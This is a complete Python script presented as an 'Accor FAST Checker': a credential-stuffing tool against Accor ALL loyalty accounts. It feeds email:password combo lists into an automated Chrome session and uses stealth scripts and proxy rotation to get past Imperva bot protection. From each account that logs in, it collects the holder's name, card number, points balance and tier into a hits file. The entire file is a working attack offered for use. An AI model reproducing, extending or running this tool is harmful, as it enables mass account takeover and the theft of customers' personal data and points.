#!/usr/bin/env python3
"""
Accor ALL (accor.com) FAST Checker — Lightweight, No PC Lag
Uses a SINGLE persistent Chrome with page reuse for maximum speed
without eating your CPU/RAM.

One Chrome instance handles ALL combos (no multi-browser lag).
Optionally 2-3 parallel browsers max for higher CPM while staying light.

Credits: Akaza (@akaza_isnt)
"""

import asyncio
import argparse
import json
import os
import re
import sys
import tempfile
import shutil
import time
from collections import deque
from pathlib import Path

try:
    from playwright.async_api import async_playwright, TimeoutError as PwTimeout
except ImportError:
    print("[!] playwright not installed. Run: pip install playwright && python -m playwright install")
    sys.exit(1)


# ─── ANSI colors ─────────────────────────────────────────────────────────────
class C:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    GREY    = '\033[90m'

try:
    import colorama
    colorama.just_fix_windows_console()
except Exception:
    if os.name == 'nt':
        os.system('')


# ─── Stealth script ──────────────────────────────────────────────────────────
STEALTH_JS = r"""
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
Object.defineProperty(navigator, 'plugins', {
    get: () => [1,2,3,4,5].map(i => ({name:'Plugin '+i, filename:'p'+i+'.dll'}))
});
try { Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8}); } catch(e) {}
try { Object.defineProperty(navigator, 'deviceMemory', {get: () => 8}); } catch(e) {}
window.chrome = window.chrome || {};
window.chrome.runtime = window.chrome.runtime || {};
window.chrome.app = window.chrome.app || {isInstalled: false};
const _origQuery = window.navigator.permissions && window.navigator.permissions.query;
if (_origQuery) {
    window.navigator.permissions.query = (p) => (
        p && p.name === 'notifications'
            ? Promise.resolve({state: Notification.permission})
            : _origQuery(p)
    );
}
try {
    const _gp = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(p) {
        if (p === 37445) return 'Intel Inc.';
        if (p === 37446) return 'Intel Iris OpenGL Engine';
        return _gp.call(this, p);
    };
} catch(e) {}
"""

_BLOCKED = {'image', 'media', 'font', 'stylesheet'}


# ─── Proxy extension ─────────────────────────────────────────────────────────
def create_proxy_extension(host, port, user, passwd, ext_dir):
    os.makedirs(ext_dir, exist_ok=True)
    manifest = {"version":"1.0.0","manifest_version":2,"name":"Proxy Auth",
                "permissions":["proxy","tabs","unlimitedStorage","storage",
                "<all_urls>","webRequest","webRequestBlocking"],
                "background":{"scripts":["background.js"]},"minimum_chrome_version":"22.0.0"}
    bg = f'''var config={{mode:"fixed_servers",rules:{{singleProxy:{{scheme:"http",host:"{host}",port:parseInt({port})}},bypassList:["localhost"]}}}};
chrome.proxy.settings.set({{value:config,scope:"regular"}},function(){{}});
function callbackFn(d){{return{{authCredentials:{{username:"{user}",password:"{passwd}"}}}}}};
chrome.webRequest.onAuthRequired.addListener(callbackFn,{{urls:["<all_urls>"]}},['blocking']);'''
    with open(os.path.join(ext_dir, "manifest.json"), "w") as f:
        json.dump(manifest, f)
    with open(os.path.join(ext_dir, "background.js"), "w") as f:
        f.write(bg)
    return ext_dir



# ─── Proxy parser ─────────────────────────────────────────────────────────────
def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    for proto in ('socks5://', 'socks4://', 'https://', 'http://'):
        if proxy_str.lower().startswith(proto):
            proxy_str = proxy_str[len(proto):]
            break
    host, port, user, passwd = None, None, None, None
    if '@' in proxy_str:
        left, right = proxy_str.rsplit('@', 1)
        rp = right.split(':')
        lp = left.split(':', 1)
        if len(rp) == 2 and rp[1].isdigit():
            host, port = rp[0], rp[1]
            user = lp[0]
            passwd = lp[1] if len(lp) > 1 else None
        else:
            host = rp[0]
            port = rp[1] if len(rp) > 1 else '80'
            user, passwd = lp[0], lp[1] if len(lp) > 1 else None
    else:
        parts = proxy_str.split(':')
        if len(parts) == 2:
            host, port = parts[0], parts[1]
        elif len(parts) == 4:
            if parts[1].isdigit():
                host, port, user, passwd = parts
            elif parts[3].isdigit():
                user, passwd, host, port = parts
            else:
                host, port, user, passwd = parts
        elif len(parts) == 3:
            host, port, user = parts
        else:
            return None
    if not host or not port:
        return None
    try:
        port = int(port)
    except (ValueError, TypeError):
        return None
    return {'host': host, 'port': port, 'user': user, 'pass': passwd}


# ─── CPM Tracker ──────────────────────────────────────────────────────────────
class CPMTracker:
    def __init__(self, window=60):
        self._window = window
        self._timestamps = deque()

    def hit(self):
        self._timestamps.append(time.time())

    @property
    def cpm(self):
        now = time.time()
        cutoff = now - self._window
        while self._timestamps and self._timestamps[0] < cutoff:
            self._timestamps.popleft()
        return int(len(self._timestamps) * (60 / self._window))



# ─── Core login flow (optimized for page reuse) ──────────────────────────────
async def do_login_flow(page, email, password, verbose=False):
    """
    Execute Accor login on an already-open page.
    Designed to be called repeatedly on the same page object —
    we just navigate back to the login URL each time (no new page/context).
    """
    result = {
        'email': email, 'password': password, 'status': 'DEAD',
        'name': None, 'tier': None, 'points': None,
        'card': None, 'nights': None, 'error': None
    }

    try:
        # Step 1: Visit homepage FIRST — this is critical for Imperva.
        # Imperva sets the reese84 cookie on the main domain. If we go
        # straight to login.accor.com, we get blocked. The homepage visit
        # solves the challenge in the real Chrome environment.
        try:
            await page.goto('https://all.accor.com/a/en.html',
                            wait_until='domcontentloaded', timeout=30000)
        except PwTimeout:
            pass
        await page.wait_for_timeout(2000)

        # Step 2: Extract the OAuth login URL from the page (same as
        # accor akaza.py's working approach)
        if 'login.accor.com' not in page.url:
            auth_url = await page.evaluate('''() => {
                // The sign-in link is inside ace-block-enrollment's Shadow DOM
                const el = document.querySelector('ace-block-enrollment');
                if (el && el.shadowRoot) {
                    const link = el.shadowRoot.querySelector('a[href*="authentication"]');
                    if (link) return link.href;
                }
                // Fallback: check regular DOM
                const links = document.querySelectorAll('a[href*="api.accor.com/authentication"]');
                for (const l of links) return l.href;
                return null;
            }''')

            if auth_url:
                try:
                    await page.goto(auth_url, wait_until='domcontentloaded', timeout=30000)
                except PwTimeout:
                    pass
                try:
                    await page.wait_for_load_state('networkidle', timeout=15000)
                except Exception:
                    pass
                await page.wait_for_timeout(1500)
            else:
                # Fallback: click the Sign in button via JS
                await page.evaluate('''() => {
                    const btns = document.querySelectorAll('button');
                    for (const b of btns) {
                        if (b.textContent.trim().includes('Sign in')) { b.click(); return; }
                    }
                    const links = document.querySelectorAll('a');
                    for (const l of links) {
                        if (l.textContent.trim() === 'Sign in') { l.click(); return; }
                    }
                }''')
                try:
                    await page.wait_for_url('**/login.accor.com/**', timeout=20000)
                except PwTimeout:
                    pass

        if 'login.accor.com' not in page.url:
            result['error'] = f'Cannot reach login page ({page.url[:50]})'
            return result

        # Wait for email field (30s patient wait)
        email_loc = page.locator(
            'input[type="email"], input[name*="email" i], '
            'input[autocomplete="username"], input[type="text"]'
        ).first

        try:
            await email_loc.wait_for(state='visible', timeout=25000)
        except PwTimeout:
            try:
                await page.wait_for_load_state('networkidle', timeout=8000)
            except Exception:
                pass
            try:
                await email_loc.wait_for(state='visible', timeout=10000)
            except PwTimeout:
                result['error'] = 'Email field never appeared (Imperva block?)'
                return result

        if verbose:
            print(f"    [i] Filling email...")

        await email_loc.fill(email)
        await page.wait_for_timeout(200)

        # Submit email
        await page.locator('button[type="submit"]').first.click(timeout=5000)

        # Wait for password field (up to 25s)
        pw_loc = page.locator('input[type="password"]').first
        try:
            await page.wait_for_load_state('networkidle', timeout=12000)
        except Exception:
            pass

        try:
            await pw_loc.wait_for(state='visible', timeout=25000)
        except PwTimeout:
            # Check if account doesn't exist
            html = await page.content()
            lower = html.lower()
            if 'create your account' in lower or 'create an account' in lower:
                result['error'] = 'Account not registered'
                return result
            result['error'] = 'Password field never appeared'
            return result

        if verbose:
            print(f"    [i] Filling password...")

        # Fill and submit password
        await pw_loc.fill(password)
        await page.wait_for_timeout(200)
        await page.locator('button[type="submit"]').first.click(timeout=5000)

        # Wait for redirect (up to 20s)
        redirected = False
        for _ in range(20):
            await page.wait_for_timeout(1000)
            if 'login.accor.com' not in page.url:
                redirected = True
                break

        if not redirected:
            html = (await page.content()).lower()
            if any(x in html for x in ['incorrect', 'invalid', 'wrong password']):
                result['error'] = 'Invalid password'
            elif any(x in html for x in ['locked', 'blocked', 'too many']):
                result['error'] = 'Account locked'
            else:
                result['error'] = 'Login failed (stuck on login page)'
            return result

        # SUCCESS
        result['status'] = 'ALIVE'

        if verbose:
            print(f"    [+] LOGIN SUCCESS! Extracting data...")

        # Wait for page to settle
        try:
            await page.wait_for_load_state('domcontentloaded', timeout=10000)
        except Exception:
            pass
        await page.wait_for_timeout(1000)


        # Capture data via API intercept on loyalty page
        api_responses = []

        async def handle_resp(response):
            if 'api.accor.com/customer/' in response.url and response.status == 200:
                try:
                    data = await response.json()
                    api_responses.append(data)
                except Exception:
                    pass

        page.on('response', handle_resp)
        try:
            await page.goto('https://all.accor.com/account/en/my-loyalty-program',
                            wait_until='networkidle', timeout=20000)
            await page.wait_for_timeout(2000)
        except Exception:
            pass
        page.remove_listener('response', handle_resp)

        # Find best API response
        api_data = {}
        for resp in api_responses:
            if isinstance(resp, dict) and 'loyalty' in resp:
                if len(resp.get('loyalty', {})) > len(api_data.get('loyalty', {})):
                    api_data = resp
            elif not api_data and isinstance(resp, dict):
                api_data = resp

        if api_data:
            # Name
            try:
                ind = api_data.get('individual', {}).get('individualName', {})
                first = ind.get('firstName', '')
                last = ind.get('lastName', '')
                if first or last:
                    result['name'] = f"{first} {last}".strip()
            except Exception:
                pass

            # Card
            try:
                cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                if isinstance(cards, list) and cards:
                    result['card'] = str(cards[0].get('cardNumber', ''))
            except Exception:
                pass

            # Points
            try:
                bal = api_data.get('loyalty', {}).get('balances', {})
                pts = bal.get('nbPoints')
                if pts is not None:
                    result['points'] = str(pts)
            except Exception:
                pass

            # Nights
            try:
                bal = api_data.get('loyalty', {}).get('balances', {})
                n = bal.get('currentNightsBalance')
                if n is not None:
                    result['nights'] = str(n)
            except Exception:
                pass

            # Tier
            try:
                TIER_MAP = {'A1':'Classic','A2':'Silver','A3':'Gold',
                            'A4':'Platinum','A5':'Diamond','A6':'Limitless'}
                cards = api_data.get('loyalty', {}).get('loyaltyCards', {}).get('card', [])
                if isinstance(cards, list) and cards:
                    code = cards[0].get('cardProduct', {}).get('cardCodeTARS', '')
                    if code in TIER_MAP:
                        result['tier'] = TIER_MAP[code]
            except Exception:
                pass

    except Exception as e:
        result['error'] = str(e)[:100]

    return result



# ─── Persistent browser worker ────────────────────────────────────────────────
async def browser_worker(worker_id, queue, proxies, proxy, chrome_path,
                         headless, verbose, results_lock, stats):
    """
    One persistent browser that processes many combos from the queue.
    The browser stays open — we just clear cookies and re-navigate for
    each combo. This is WAY lighter on CPU/RAM than launching a new
    Chrome per combo.
    """
    ext_dir = None
    user_data_dir = None

    try:
        async with async_playwright() as p:
            launch_args = [
                '--no-first-run', '--no-default-browser-check',
                '--disable-blink-features=AutomationControlled',
                '--disable-features=IsolateOrigins,site-per-process,TranslateUI',
                '--disable-infobars', '--disable-gpu',
                '--disable-dev-shm-usage',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-renderer-backgrounding',
                '--disable-notifications', '--disable-translate',
                '--disable-sync', '--disable-default-apps',
                '--disable-component-update', '--mute-audio',
                '--no-sandbox', '--no-pings',
                '--window-position=-32000,-32000',
                '--window-size=1280,800',
                '--start-minimized',
            ]

            # Pick proxy for this worker
            px = proxies[worker_id % len(proxies)] if proxies else proxy
            if px and px.get('user'):
                ext_dir = tempfile.mkdtemp(prefix=f'proxy_w{worker_id}_')
                create_proxy_extension(px['host'], px['port'], px['user'], px['pass'], ext_dir)
                launch_args.extend([
                    f'--load-extension={ext_dir}',
                    f'--disable-extensions-except={ext_dir}',
                ])
            elif px:
                launch_args.append(f'--proxy-server={px["host"]}:{px["port"]}')

            user_data_dir = tempfile.mkdtemp(prefix=f'accor_w{worker_id}_')

            # Find Chrome
            chrome = chrome_path
            if not chrome:
                for path in [
                    shutil.which('google-chrome-stable'),
                    shutil.which('google-chrome'),
                    '/usr/bin/google-chrome-stable', '/usr/bin/google-chrome',
                    '/opt/google/chrome/google-chrome',
                    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
                    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
                ]:
                    if path and os.path.exists(path):
                        chrome = path
                        break

            context = await p.chromium.launch_persistent_context(
                user_data_dir,
                executable_path=chrome,
                headless=False,
                args=launch_args,
                ignore_default_args=['--enable-automation'],
                viewport={'width': 1280, 'height': 800},
            )

            page = context.pages[0] if context.pages else await context.new_page()
            await page.add_init_script(STEALTH_JS)

            # Block heavy resources for speed
            async def route_handler(route):
                try:
                    if route.request.resource_type in _BLOCKED:
                        await route.abort()
                    else:
                        await route.continue_()
                except Exception:
                    try:
                        await route.continue_()
                    except Exception:
                        pass
            await page.route('**/*', route_handler)

            # Process combos from queue using this ONE browser
            while True:
                try:
                    idx, (email, password) = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                # Clear cookies between checks for fresh login
                try:
                    await context.clear_cookies()
                except Exception:
                    pass

                try:
                    result = await do_login_flow(page, email, password, verbose)
                except Exception as e:
                    result = {
                        'email': email, 'password': password, 'status': 'DEAD',
                        'name': None, 'tier': None, 'points': None,
                        'card': None, 'nights': None,
                        'error': f'Worker exception: {str(e)[:80]}'
                    }

                # Record result
                async with results_lock:
                    stats['cpm'].hit()
                    if result['status'] == 'ALIVE':
                        stats['alive'] += 1
                        stats['hits_file'].write(format_result_plain(result) + '\n')
                        stats['hits_file'].flush()
                        sys.stdout.write('\r' + ' ' * 100 + '\r')
                        print(f"  {format_result(result)}")
                    else:
                        stats['dead'] += 1
                        stats['bad_file'].write(format_result_plain(result) + '\n')
                        stats['bad_file'].flush()
                        if verbose:
                            sys.stdout.write('\r' + ' ' * 100 + '\r')
                            print(f"  {format_result(result)}")

                    elapsed = time.time() - stats['start']
                    _print_stats(stats['alive'], stats['dead'],
                                 stats['total'], stats['cpm'].cpm, elapsed)

                queue.task_done()

            await context.close()

    except Exception as e:
        if verbose:
            print(f"  {C.RED}[Worker {worker_id}] Fatal: {str(e)[:80]}{C.RESET}")
    finally:
        if ext_dir and os.path.exists(ext_dir):
            shutil.rmtree(ext_dir, ignore_errors=True)
        if user_data_dir and os.path.exists(user_data_dir):
            shutil.rmtree(user_data_dir, ignore_errors=True)



# ─── Output formatting ────────────────────────────────────────────────────────
def format_result(result):
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"{C.GREEN}{C.BOLD}[ALIVE]{C.RESET} {cred}"]
        if result['name']:   parts.append(f"Name: {result['name']}")
        if result['tier']:   parts.append(f"Tier: {result['tier']}")
        if result['points']: parts.append(f"Points: {result['points']}")
        if result['card']:   parts.append(f"Card#: {result['card']}")
        if result['nights']: parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    return f"{C.RED}[DEAD]{C.RESET} {cred} | {result.get('error', 'Unknown')}"


def format_result_plain(result):
    cred = f"{result['email']}:{result['password']}"
    if result['status'] == 'ALIVE':
        parts = [f"[ALIVE] {cred}"]
        if result['name']:   parts.append(f"Name: {result['name']}")
        if result['tier']:   parts.append(f"Tier: {result['tier']}")
        if result['points']: parts.append(f"Points: {result['points']}")
        if result['card']:   parts.append(f"Card#: {result['card']}")
        if result['nights']: parts.append(f"Nights: {result['nights']}")
        return ' | '.join(parts)
    return f"[DEAD] {cred} | {result.get('error', 'Unknown')}"


def _print_stats(alive, dead, total, cpm, elapsed):
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    checked = alive + dead
    line = (
        f"\r  {C.BOLD}[STATS]{C.RESET} "
        f"{C.GREEN}Alive:{alive}{C.RESET} "
        f"{C.RED}Dead:{dead}{C.RESET} "
        f"{C.YELLOW}CPM:{cpm}{C.RESET} "
        f"{C.CYAN}Checked:{checked}/{total}{C.RESET} "
        f"{C.GREY}Left:{total-checked} | {mins:02d}:{secs:02d}{C.RESET}  "
    )
    sys.stdout.write(line)
    sys.stdout.flush()



# ─── Main checker engine ──────────────────────────────────────────────────────
async def run_checker(combo_source, proxy_arg, chrome_path, verbose,
                      threads=3, output_folder="Accor results"):
    """
    Launch `threads` persistent Chrome workers. Each worker keeps ONE
    browser open and processes many combos sequentially. This means:
    - 3 threads = only 3 Chrome instances (not 50!)
    - Each instance reuses itself for dozens/hundreds of combos
    - Your PC stays responsive even at high CPM
    """
    os.makedirs(output_folder, exist_ok=True)
    hits_path = os.path.join(output_folder, "hits.txt")
    bad_path = os.path.join(output_folder, "bad.txt")

    # Parse proxies
    proxy = None
    proxies = []
    if proxy_arg:
        if os.path.isfile(proxy_arg):
            with open(proxy_arg) as f:
                proxies = [parse_proxy(l) for l in f if l.strip()]
                proxies = [p for p in proxies if p]
            print(f"[*] Loaded {len(proxies)} proxies")
        else:
            proxy = parse_proxy(proxy_arg)
            if proxy:
                print(f"[*] Proxy: {proxy['host']}:{proxy['port']}")

    # Parse combos
    combos = []
    if combo_source:
        if os.path.isfile(combo_source):
            with open(combo_source) as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        e, pw = line.split(':', 1)
                        combos.append((e.strip(), pw.strip()))
            print(f"[*] Loaded {len(combos)} combos")
        elif ':' in combo_source:
            e, pw = combo_source.split(':', 1)
            combos.append((e.strip(), pw.strip()))

    if not combos:
        print("[!] No combos")
        return

    print(f"[*] Mode: {C.CYAN}{C.BOLD}Persistent Chrome (reuse){C.RESET} — PC stays smooth!")
    print(f"[*] Workers: {C.YELLOW}{C.BOLD}{threads}{C.RESET} (each = 1 Chrome handling many combos)")
    print(f"[*] Total combos: {len(combos)}")
    print()

    # Shared state
    queue = asyncio.Queue()
    for i, combo in enumerate(combos):
        await queue.put((i, combo))

    stats = {
        'alive': 0,
        'dead': 0,
        'total': len(combos),
        'cpm': CPMTracker(window=60),
        'start': time.time(),
        'hits_file': open(hits_path, 'a'),
        'bad_file': open(bad_path, 'a'),
    }
    results_lock = asyncio.Lock()

    # Launch workers (each one opens ONE Chrome and processes many combos)
    worker_count = min(threads, len(combos))
    tasks = [
        asyncio.create_task(
            browser_worker(i, queue, proxies, proxy, chrome_path,
                           True, verbose, results_lock, stats)
        )
        for i in range(worker_count)
    ]

    await asyncio.gather(*tasks)

    # Final stats
    elapsed = time.time() - stats['start']
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    avg_cpm = int((stats['alive'] + stats['dead']) / (elapsed / 60)) if elapsed > 0 else 0

    sys.stdout.write('\r' + ' ' * 100 + '\r')
    print(f"\n{'='*60}")
    print(f"  {C.BOLD}{C.WHITE}RESULTS{C.RESET}")
    print(f"  {C.GREEN}Alive: {stats['alive']}{C.RESET}  |  "
          f"{C.RED}Dead: {stats['dead']}{C.RESET}  |  Total: {len(combos)}")
    print(f"  {C.YELLOW}Average CPM: {avg_cpm}{C.RESET}  |  Time: {mins:02d}:{secs:02d}")
    print(f"  Hits: {C.GREEN}{hits_path}{C.RESET}")
    print(f"  Bad: {C.RED}{bad_path}{C.RESET}")
    print(f"{'='*60}")

    stats['hits_file'].close()
    stats['bad_file'].close()



# ─── Banner ───────────────────────────────────────────────────────────────────
_BANNER = r"""
  ▄▄▄       ██ ▄█▀▄▄▄      ▒███████▒ ▄▄▄
 ▒████▄     ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒████▄
 ▒██  ▀█▄  ▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██  ▀█▄
 ░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██   ▄▀▒   ░░██▄▄▄▄██
  ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒▒███████▒ ▓█   ▓██▒
  ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░░░▒ ▓░▒░▒ ▒▒   ▓▒█░
   ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░░ ░▒ ▒ ░  ▒   ▒▒ ░
   ░   ▒   ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░  ░   ▒
       ░  ░░  ░        ░  ░  ░ ░           ░  ░
"""


def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{C.CYAN}{C.BOLD}{_BANNER}{C.RESET}")
    bar = '═' * 68
    print(f"{C.CYAN}{bar}{C.RESET}")
    print(f"   {C.WHITE}{C.BOLD}AKAZA  ACCOR  FAST CHECKER{C.RESET}   "
          f"{C.GREY}|{C.RESET}  {C.YELLOW}v3.0{C.RESET}  "
          f"{C.GREY}|{C.RESET}  TG: {C.YELLOW}{C.BOLD}@akaza_isnt{C.RESET}")
    print(f"   {C.MAGENTA}Persistent Chrome — Max speed, minimal PC load{C.RESET}")
    print(f"{C.CYAN}{bar}{C.RESET}\n")


# ─── Settings + Menu ──────────────────────────────────────────────────────────
class Settings:
    def __init__(self):
        self.combo_source = None
        self.proxy_arg    = None
        self.chrome_path  = None
        self.threads      = 3      # 3 persistent Chromes = light but fast
        self.verbose      = False

    @staticmethod
    def fmt_value(v, default='not set'):
        if v is None or v == '':
            return f"{C.DIM}{default}{C.RESET}"
        s = str(v)
        if len(s) > 42:
            s = s[:39] + '...'
        return f"{C.YELLOW}{s}{C.RESET}"

    @staticmethod
    def fmt_toggle(on):
        if on:
            return f"{C.GREEN}{C.BOLD}[ ON  ]{C.RESET}"
        return f"{C.RED}{C.BOLD}[ OFF ]{C.RESET}"



def _print_menu(s):
    show_banner()

    print(f"  {C.BOLD}{C.WHITE}CONFIG{C.RESET}")
    print(f"  {C.GREY}{'─' * 50}{C.RESET}")

    print(f"   {C.CYAN}[1]{C.RESET} Combo source ........ {s.fmt_value(s.combo_source)}")
    print(f"        {C.GREY}↪ File path (email:pass per line) or single combo{C.RESET}")

    print(f"   {C.CYAN}[2]{C.RESET} Proxy ............... {s.fmt_value(s.proxy_arg, 'none')}")
    print(f"        {C.GREY}↪ Proxy file or single proxy (all formats){C.RESET}")

    print(f"   {C.CYAN}[3]{C.RESET} Chrome path ......... {s.fmt_value(s.chrome_path, 'auto-detect')}")
    print(f"        {C.GREY}↪ Path to Chrome binary (optional){C.RESET}")

    print(f"   {C.CYAN}[4]{C.RESET} Workers ............. {C.YELLOW}{C.BOLD}{s.threads}{C.RESET}")
    print(f"        {C.GREY}↪ Persistent Chrome instances. Each one processes MANY combos.{C.RESET}")
    print(f"        {C.GREY}  3 = smooth PC + good speed. 5 = faster. 1 = ultra light.{C.RESET}")
    print(f"        {C.GREY}  Unlike old version: 3 workers ≠ 3 combos. Each worker runs{C.RESET}")
    print(f"        {C.GREY}  until ALL combos are done, reusing 1 browser the whole time.{C.RESET}")

    print(f"   {C.CYAN}[5]{C.RESET} Verbose logs ........ {s.fmt_toggle(s.verbose)}")
    print(f"        {C.GREY}↪ Print step-by-step per combo{C.RESET}")

    print()
    print(f"  {C.BOLD}{C.WHITE}ACTIONS{C.RESET}")
    print(f"  {C.GREY}{'─' * 50}{C.RESET}")
    print(f"   {C.GREEN}{C.BOLD}[S]{C.RESET} Start checking")
    print(f"   {C.YELLOW}{C.BOLD}[R]{C.RESET} Reset settings")
    print(f"   {C.RED}{C.BOLD}[Q]{C.RESET} Quit")
    print()


def _prompt(label, default=None):
    extra = f" {C.DIM}[{default}]{C.RESET}" if default else ""
    try:
        return input(f"  {C.CYAN}>{C.RESET} {C.WHITE}{label}{extra}{C.WHITE}:{C.RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return ''


def _flash(msg, color=C.YELLOW):
    print(f"  {color}>{C.RESET} {msg}")



# ─── Menu loop ────────────────────────────────────────────────────────────────
async def menu_mode():
    s = Settings()

    while True:
        _print_menu(s)
        choice = _prompt("Choose option").lower()

        if choice == '1':
            v = _prompt("Combo file path or 'email:pass'")
            s.combo_source = v or None
            _flash("Combo updated." if v else "Cleared.")

        elif choice == '2':
            v = _prompt("Proxy file or single proxy (blank = none)")
            s.proxy_arg = v or None
            _flash("Proxy updated." if v else "Cleared.")

        elif choice == '3':
            v = _prompt("Chrome path (blank = auto)")
            s.chrome_path = v or None
            _flash("Chrome path set." if v else "Auto-detect.")

        elif choice == '4':
            v = _prompt("Workers (1-10, default 3)", default=str(s.threads))
            try:
                val = int(v) if v else s.threads
                s.threads = max(1, min(10, val))
                _flash(f"Workers = {s.threads}", C.GREEN)
            except ValueError:
                _flash("Invalid number.", C.RED)

        elif choice == '5':
            s.verbose = not s.verbose
            _flash(f"Verbose: {'ON' if s.verbose else 'OFF'}",
                   C.GREEN if s.verbose else C.RED)

        elif choice == 'r':
            s = Settings()
            _flash("Reset to defaults.")

        elif choice == 's':
            if not s.combo_source:
                _flash("Set combo source first! [1]", C.RED)
                input(f"  {C.DIM}Press Enter...{C.RESET}")
                continue
            print()
            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
            await run_checker(
                s.combo_source, s.proxy_arg, s.chrome_path,
                s.verbose, threads=s.threads,
            )
            print(f"{C.CYAN}{'─' * 68}{C.RESET}")
            input(f"\n  {C.DIM}Press Enter to return to menu...{C.RESET}")

        elif choice in ('q', 'exit'):
            print(f"\n  {C.MAGENTA}{C.BOLD}> Bye! — @akaza_isnt{C.RESET}\n")
            return

        else:
            _flash("Unknown option.", C.RED)
            await asyncio.sleep(0.3)


# ─── Entry ────────────────────────────────────────────────────────────────────
async def main():
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description='Akaza Accor FAST Checker')
        parser.add_argument('-c', '--combo', help='Combo file or email:pass')
        parser.add_argument('-p', '--proxy', help='Proxy file or proxy string')
        parser.add_argument('--chrome', help='Chrome path')
        parser.add_argument('-t', '--threads', type=int, default=3,
                            help='Persistent browser workers (default 3)')
        parser.add_argument('-v', '--verbose', action='store_true')
        args = parser.parse_args()
        await run_checker(args.combo, args.proxy, args.chrome,
                          args.verbose, threads=args.threads)
    else:
        await menu_mode()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n  {C.MAGENTA}> Bye!{C.RESET}")
